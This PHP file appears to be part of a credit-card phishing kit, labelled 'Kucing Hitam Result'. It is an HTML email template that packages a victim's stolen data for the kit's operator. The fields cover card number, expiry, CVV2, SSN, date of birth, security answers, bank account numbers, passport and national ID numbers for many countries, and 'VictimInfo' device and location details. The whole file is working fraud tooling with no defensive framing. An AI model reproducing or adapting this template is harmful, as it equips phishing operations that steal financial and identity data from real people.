<?php @error_reporting(0);
$data = "
    
     <html>
        <body>
           <div style='background-color:transparent;'>
      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->

              <!--[if (mso)|(IE)]><td align='center' width='480' style='background-color:#000000; width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
              <div style='background-color: #000000; width: 100% !important;'>
              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->

                  
                    <div class=''>
  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
  <div style='color:#FFFFFF;line-height:150%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'>  
    <div style='font-size:12px;line-height:18px;color:#FFFFFF;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 14px;line-height: 21px'><font color='orange'>[+]-----------------[ <font color='red'>Kucing</font> <font color='white'>Hitam</font> <font color='blue'>Result</font> ]-----------------[+]</font></p></div> 
  </div>
  <!--[if mso]></td></tr></table><![endif]-->
</div>
                  
              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
              </div>
            </div>
          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
        </div>
      </div>
    </div>    <div style='background-color:transparent;'>
      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->

              <!--[if (mso)|(IE)]><td align='center' width='480' style=' width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
              <div style='background-color: transparent; width: 100% !important;'>
              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->

                  
                    <div class=''>
  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
  <div style='color:#555555;line-height:200%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;'>  
    <div style='font-size:12px;line-height:24px;color:#555555;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 12px;line-height: 24px'><p style='margin: 0;font-size: 12px;line-height: 24px'>++=================== [ Kartu Kredit ] ==================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
<img width='20px' height='18px' align='center' src='https://www.shareicon.net/data/128x128/2015/08/19/87773_business_512x512.png'/> BIN/IIN Info  :  $Brand - $Bank - $Type - $Catergory <br>
<img width='20px' height='18px' align='center' src='http://icon-icons.com/icons2/934/PNG/128/person-black-user-shape_icon-icons.com_72962.png'/> Cardholder Name :   $ccname <br>
<img width='20px' height='18px' align='center' src='http://www.lojastamoyo.com.br/image/data/icone-cartao-de-credito.png'/>  Card Number    :  $ccno <br>
<img width='20px' height='18px' align='center' src='https://cdn2.iconfinder.com/data/icons/web-and-mobile-ui-volume-27/48/1328-256.png'/> Exp Date    :  $ccexp <br>
<img width='20px' height='20px' align='center' src='https://maxcdn.icons8.com/Share/icon/Ecommerce//card_verification_value_1600.png'/> Cvv2      :  $secode <br>
<img width='20px' height='20px' align='center' src='https://maxcdn.icons8.com/Share/icon/Ecommerce//card_verification_value_1600.png'/> For Check       :  $ccno  / $ccexp  / $secode <br>
<img width='20px' height='20px' align='center' src='https://cdn4.iconfinder.com/data/icons/security-28/52/shield-security-question-mark-128.png'/> Sec Question :  $q1 <br>
<img width='20px' height='20px' align='center' src='https://cdn4.iconfinder.com/data/icons/security-28/52/shield-security-question-mark-128.png'/> Sec Answer   :  $a1 <br>
<p style='margin: 0;font-size: 12px;line-height: 24px'>++==================== [ Alamat] ====================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
<img width='20px' height='20px' align='center' src='https://elearning.stockton.edu/wp-content/uploads/2015/08/photoid_icon.png'/> Full Name     :  $name <br>
<img width='20px' height='20px' align='center' src='https://cdn1.iconfinder.com/data/icons/social-messaging-productivity-vol-5/512/235-Address_apartment_casa_home_homepage_house_local-128.png'/> Address      :  $address <br>
<img width='20px' height='20px' align='center' src='https://cdn1.iconfinder.com/data/icons/social-messaging-productivity-vol-5/512/235-Address_apartment_casa_home_homepage_house_local-128.png'/> City/Town    :  $city <br>
<img width='20px' height='20px' align='center' src='https://cdn1.iconfinder.com/data/icons/social-messaging-productivity-vol-5/512/235-Address_apartment_casa_home_homepage_house_local-128.png'/> State      :  $state <br>
<img width='20px' height='20px' align='center' src='http://www.kinlingrover.com/assets/images/614/searchform/64/zipcode-search.png'/> Zip/PostCode  :  $postcode <br>
<img width='20px' height='20px' align='center' src='http://icon-icons.com/icons2/1131/PNG/128/flag_80348.png'/> Country     :  $nama_negara <br>
<img width='20px' height='20px' align='center' src='https://image.flaticon.com/icons/png/128/126/126509.png'/> Phone Number :  $telephone <br>
<img width='20px' height='20px' align='center' src='https://cdn3.iconfinder.com/data/icons/business-and-finance-outline-3/64/bussiness-and-finance-outline-3-20-128.png'/> SSN        :  $ssn <br>
<img width='20px' height='20px' align='center' src='https://asthaskitchendilse.files.wordpress.com/2016/08/birthday-cake-1.png'/> DOB       :  $dob <br>++===================== [ VBV ] ====================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> Account Number (UK/IE/IN/TH) : $acno <br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> Sortcode (UK/IE)       : $sort <br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> Passport (CY)          : $passport <br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> Bank Access Number (NZ)      : $bans <br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> Citizen ID (TH)          : $citizenid <br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> Qatar ID           : $qatarid <br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> National ID (SA)       : $naid <br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> Civil ID Number (KW)     : $civilid <br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> ID Number (GR/HK)       : $numbid <br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> NAB ID (AU)       : $nabid <br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> Card ID (JP)                    :  $cardid<br>
<img width='20px' height='20px' align='center' src='https://www.shareicon.net/data/128x128/2015/10/03/650134_identity_512x512.png'/> Card Password (JP)              :  $cardpassword<br>+=================== [ Device Info ] ==================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
<img width='20px' height='18px' align='center' src='https://cdn0.iconfinder.com/data/icons/thin-navigation/57/thin-122_location_pin_map-256.png'/> From            :  $VictimInfo1<br>
<img width='20px' height='18px' align='center' src='https://cdn0.iconfinder.com/data/icons/thin-navigation/57/thin-122_location_pin_map-256.png'/> Location        :  $VictimInfo2<br>
<img width='20px' height='18px' align='center' src='https://www.shareicon.net/data/128x128/2015/11/08/668694_windows_512x512.png'/> Platform        : $os<br>
<img width='20px' height='18px' align='center' src='https://www.shareicon.net/data/128x128/2015/09/25/107200_browser_512x512.png'/> Browser         : $br</p>
</div> 
  </div>
  <!--[if mso]></td></tr></table><![endif]-->
</div>
                  
              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
              </div>
            </div>
          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
        </div>
      </div>
    </div>    <div style='background-color:transparent;'>
      <div style='Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: #FFFFFF;' class='block-grid '>
        <div style='border-collapse: collapse;display: table;width: 100%;background-color:#FFFFFF;'>
          <!--[if (mso)|(IE)]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='background-color:transparent;' align='center'><table cellpadding='0' cellspacing='0' border='0' style='width: 480px;'><tr class='layout-full-width' style='background-color:#FFFFFF;'><![endif]-->

              <!--[if (mso)|(IE)]><td align='center' width='480' style='background-color:#000000; width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;' valign='top'><![endif]-->
            <div class='col num12' style='min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;'>
              <div style='background-color: #000000; width: 100% !important;'>
              <!--[if (!mso)&(!IE)]><!--><div style='border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;'><!--<![endif]-->

                  
                    <div class=''>
  <!--[if mso]><table width='100%' cellpadding='0' cellspacing='0' border='0'><tr><td style='padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'><![endif]-->
  <div style='color:#FFFFFF;line-height:150%;font-family:Tahoma, Verdana, Segoe, sans-serif; padding-right: 60px; padding-left: 60px; padding-top: 10px; padding-bottom: 10px;'>  
    <div style='font-size:12px;line-height:18px;color:#FFFFFF;font-family:Tahoma, Verdana, Segoe, sans-serif;text-align:left;'><p style='margin: 0;font-size: 14px;line-height: 21px'><font color='orange'>[+]---------------------[ <font color='red'>Silent</font> <font color='white'>Is</font> <font color='blue'>Gold</font> ]---------------------[+]</font></p></div>  
  </div>
  <!--[if mso]></td></tr></table><![endif]-->
</div>
                  
              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->
              </div>
            </div>
          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->
        </div>
      </div>
    </div>
        </body>
      </html>

    
    ";
?>